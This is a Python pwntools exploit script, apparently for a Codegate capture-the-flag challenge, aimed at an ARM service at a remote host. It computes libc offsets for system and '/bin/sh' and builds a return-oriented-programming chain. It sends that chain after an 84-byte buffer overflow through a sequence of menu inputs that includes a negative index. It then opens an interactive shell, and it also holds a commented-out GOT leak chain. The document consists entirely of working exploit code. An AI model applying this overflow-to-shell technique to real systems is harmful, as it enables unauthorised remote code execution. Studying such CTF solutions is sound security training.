from pwn import *

context.update(arch='arm')
r = remote('ch41l3ng3s.codegate.kr', 1199)

puts = 0xf66e4770
libc = puts - 0x5e770
system = libc + 0x38634
binsh = libc + 0x12121c

pop_r0 = p32(0x11BBC)

# For leak
#rop  = pop_r0
#rop += p32(0x2301C) # puts_ptr in GOT
#rop += p32(0x104A8) # puts
#rop += p32(0x104F0) # abort

# For shell
rop  = pop_r0
rop += p32(binsh)
rop += p32(system)

r.sendline('1')
r.sendline('0')
r.sendline('0')
r.sendline('3')
r.sendline('-1')
r.sendline('4')
r.sendline('A' * 84 + rop)
pause()

r.sendline('6')

r.readuntil('See you again :)\n')
#puts = u32(r.read(4))
r.interactive()
